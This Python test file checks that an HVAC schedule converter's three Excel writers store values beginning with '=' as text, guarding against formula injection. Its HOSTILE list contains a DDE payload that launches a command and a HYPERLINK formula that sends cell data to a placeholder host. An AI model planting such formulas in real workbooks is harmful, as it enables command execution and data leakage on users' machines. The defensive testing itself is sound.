"""A value starting with "=" must land in the workbook as text.

Excel evaluates a cell whose text starts with "=", so a space name or a
project detail carrying "=cmd|..." would run when the schedule is opened on
an engineer's machine. All three writers that put extracted or user-supplied
strings into cells go through `keep_as_text`, and each one is checked here.

Every assertion reads the file back from disk rather than the in-memory
workbook: the round trip through openpyxl's serializer is what decides
whether the type actually stuck.
"""


import openpyxl
import pytest
from PIL import Image

from hap_converter.airsizer.engine import export as air_export
from hap_converter.engine import change_request
from hap_converter.engine.xlsx_exporter import write_fcu_xlsx

# The classic DDE payload, a formula that reaches the network, and a plain
# leading "=" that a person could type by accident.
HOSTILE = [
    '=cmd|\' /C calc\'!A0',
    '=HYPERLINK("http://example.invalid/?x="&A1,"click")',
    '=1+1',
]

DETAILS = {
    "project": "Avarra by Palace", "project_no": "MLD", "stage": "100 % DD",
    "discipline": "MEP", "author": "SA", "checked": "FA",
    "revision": "2", "date": "20.04.2026",
}


def _reopen(path):
    return openpyxl.load_workbook(path).active


def _cells_holding(ws, text):
    return [c for row in ws.iter_rows() for c in row if c.value == text]


def _assert_text_not_formula(ws, text):
    found = _cells_holding(ws, text)
    assert found, f"{text!r} is not in the saved file at all"
    for cell in found:
        assert cell.data_type == "s", f"{cell.coordinate} came back as {cell.data_type}"


@pytest.mark.parametrize("hostile", HOSTILE)
def test_fcu_writer_keeps_a_leading_equals_as_text(hostile, tmp_path, config):
    """Writer 1: the schedule download, /api/hapext/download."""
    rows = [[hostile] + [""] * 13]
    target = tmp_path / "schedule.xlsx"
    write_fcu_xlsx(dict(DETAILS, project=hostile), config.csv_columns, rows, target)

    ws = _reopen(target)
    _assert_text_not_formula(ws, hostile)          # the data row
    assert len(_cells_holding(ws, hostile)) == 2   # and the project detail


def test_change_request_writer_keeps_a_leading_equals_as_text(tmp_path, config):
    """Writer 2: rows appended into a workbook the user uploaded."""
    logo = tmp_path / "logo.png"
    Image.new("RGB", (300, 100), (10, 40, 80)).save(logo)
    clean = [""] * 14
    clean[0], clean[1], clean[2], clean[3] = "#01-Corridor", "178.2", "9.2", "8.6"
    previous = tmp_path / "previous.xlsx"
    write_fcu_xlsx(dict(DETAILS, logo_path=str(logo)), config.csv_columns, [clean], previous)

    hostile_row = [""] * 14
    hostile_row[0], hostile_row[2] = HOSTILE[0], "4.4"
    schedule = change_request.load_schedule(previous, config)
    out = change_request.append_blocks(schedule, [[hostile_row]], tmp_path / "updated.xlsx")

    _assert_text_not_formula(_reopen(out), HOSTILE[0])


def test_airsizer_writer_keeps_a_leading_equals_as_text(tmp_path, air_config):
    """Writer 3: the sized schedule, /api/airsizer/export."""
    from hap_converter.airsizer.engine.models import Space

    space = Space(name=HOSTILE[0], floor_area="172.3", total_coil="13.2",
                  sens_coil="12.6", air_flow="868", is_unit=True, row=0)
    columns = air_export.visible_columns(air_config, None)
    target = air_export.write_xlsx(
        [space], {}, {}, air_config, columns, tmp_path,
        "sized", HOSTILE[2], dict(DETAILS, project=HOSTILE[1]),
    )

    ws = _reopen(target)
    _assert_text_not_formula(ws, HOSTILE[0])      # the space name
    _assert_text_not_formula(ws, HOSTILE[1])      # a project detail

    # Without project details the writer takes its other branch, where
    # `project_name` becomes a subtitle cell instead.
    bare = air_export.write_xlsx(
        [space], {}, {}, air_config, columns, tmp_path,
        "bare", HOSTILE[2], {},
    )
    _assert_text_not_formula(_reopen(bare), HOSTILE[2])


def test_an_ordinary_name_is_untouched(tmp_path, config):
    """The guard must not change anything a real schedule contains."""
    rows = [["#01-Corridor"] + [""] * 13]
    target = tmp_path / "plain.xlsx"
    write_fcu_xlsx(DETAILS, config.csv_columns, rows, target)

    ws = _reopen(target)
    assert ws["A7"].value == "#01-Corridor"
    assert ws["A7"].data_type == "s"
    assert ws["A7"].quotePrefix is False     # style array untouched


def test_a_formula_the_user_already_had_still_round_trips(tmp_path, config):
    """Out of scope by design: a formula in the uploaded workbook is the
    user's own, and appending new rows must not rewrite their cells."""
    logo = tmp_path / "logo.png"
    Image.new("RGB", (300, 100), (10, 40, 80)).save(logo)
    clean = [""] * 14
    clean[0], clean[1], clean[2], clean[3] = "#01-Corridor", "178.2", "9.2", "8.6"
    previous = tmp_path / "previous.xlsx"
    write_fcu_xlsx(dict(DETAILS, logo_path=str(logo)), config.csv_columns, [clean], previous)

    wb = openpyxl.load_workbook(previous)
    wb.active["N7"] = "=1+1"
    wb.save(previous)

    new_row = [""] * 14
    new_row[0], new_row[2] = "#02-Lobby", "4.4"
    schedule = change_request.load_schedule(previous, config)
    out = change_request.append_blocks(schedule, [[new_row]], tmp_path / "updated.xlsx")

    assert _reopen(out)["N7"].data_type == "f"
